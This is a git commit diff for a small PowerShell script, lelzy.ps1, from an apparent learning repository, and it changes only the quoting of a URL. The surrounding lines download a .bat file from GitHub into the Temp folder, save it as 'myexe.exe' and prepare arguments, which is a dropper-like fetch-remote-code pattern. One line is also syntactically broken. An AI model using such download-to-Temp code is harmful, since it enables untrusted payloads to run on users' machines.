ff981e3249d12bef179dc558f0dad4f30aba3b3d
deathlimited <denis_srk@live.com>
2017-11-17 03:39:26 +0200

    Update lelzy.ps1

--- lelzy.ps1
+++ lelzy.ps1
@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat"
+$url = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat'
 $outpath = "$env:Temp/myexe.exe"
 Invoke-WebRequest -Uri = $url -OutFile $outpath
 $args = @("Comma","Separated","Arguments")
